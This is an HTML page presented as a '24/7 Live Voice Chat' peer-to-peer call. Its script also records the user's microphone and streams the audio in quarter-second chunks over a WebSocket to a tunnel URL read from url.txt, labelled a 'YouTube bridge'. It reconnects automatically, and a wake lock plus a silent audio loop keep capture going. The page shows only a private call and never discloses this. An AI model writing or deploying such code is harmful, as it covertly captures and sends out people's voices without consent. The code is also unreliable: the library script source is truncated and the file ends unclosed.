<!DOCTYPE html>
<html>
<head>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>24/7 Live Voice Chat</title>
  <script src="https://unpkg.com"></script>
  <style>
    body { background: #0a0a0a; color: #fff; font-family: sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
    .btn { padding: 22px 42px; font-size: 20px; border: none; border-radius: 50px; cursor: pointer; font-weight: bold; }
    #joinBtn { background: #00e676; color: #000; }
    #endBtn { background: #ff1744; color: #fff; display: none; margin-top: 20px; }
    #status { margin-top: 20px; color: #aaa; font-size: 16px; padding: 0 20px; }
  </style>
</head>
<body>
  <button id="joinBtn" class="btn">TAP TO JOIN VOICE</button>
  <button id="endBtn" class="btn">DISCONNECT CALL</button>
  <div id="status">Tap button to connect instantly</div>
  <audio id="remoteAudio" autoplay></audio>
  <audio id="wakeLockAudio" loop></audio>

  <script>
    const ROOM_ID = "joyax-live-voice-2026";
    let localStream, peer, currentCall, ws, isUserEnded = false;

    document.getElementById('joinBtn').onclick = async () => {
      isUserEnded = false;
      document.getElementById('joinBtn').style.display = 'none';
      document.getElementById('endBtn').style.display = 'block';
      document.getElementById('status').innerText = "Connecting Mic...";

      const ctx = new AudioContext();
      const dest = ctx.createMediaStreamDestination();
      document.getElementById('wakeLockAudio').srcObject = dest.stream;
      document.getElementById('wakeLockAudio').play();
      if ('wakeLock' in navigator) { try { await navigator.wakeLock.request('screen'); } catch(e){} }

      localStream = await navigator.mediaDevices.getUserMedia({ audio: true });

      const res = await fetch('url.txt?t=' + Date.now());
      const tunnelUrl = (await res.text()).trim().replace('https://', 'wss://');

      connectToYouTubeBridge(tunnelUrl);
      startPeerConnection();
    };

    function connectToYouTubeBridge(wsUrl) {
      if (!wsUrl.startsWith('wss://')) return;
      ws = new WebSocket(wsUrl);
      ws.onopen = () => {
        const recorder = new MediaRecorder(localStream, { mimeType: 'audio/webm;codecs=opus' });
        recorder.ondataavailable = (e) => {
          if (e.data.size > 0 && ws.readyState === WebSocket.OPEN && !isUserEnded) ws.send(e.data);
        };
        recorder.start(250);
      };
      ws.onclose = () => { if (!isUserEnded) setTimeout(() => connectToYouTubeBridge(wsUrl), 2000); };
    }

    function startPeerConnection() {
      peer = new Peer(ROOM_ID);
      peer.on('open', () => { document.getElementById('status').innerText = "Waiting for partner... (Mic Live)"; });

      peer.on('call', (call) => {
        currentCall = call;
        call.answer(localStream);
        call.on('stream', (stream) => {
          document.getElementById('remoteAudio').srcObject = stream;
          document.getElementById('status').innerText = "Connected! Voice Live";
        });
        call.on('close', () => { if (!isUserEnded) document.getElementById('status').innerText = "Partner Disconnected"; });
      });

      peer.on('error', (err) => {
        if (err.type === 'unavailable-id') {
          const guest = new Peer();
          guest.on('open', () => {
            currentCall = guest.call(ROOM_ID, localStream);
            currentCall.on('stream', (stream) => {
              document.getElementById('remoteAudio').srcObject = stream;
              document.getElementById('status').innerText = "Connected! Voice Live";
            });
            currentCall.on('close', () => { if (!isUserEnded) document.getElementById('status').innerText = "Host Disconnected"; });
          });
        }
      });
    }
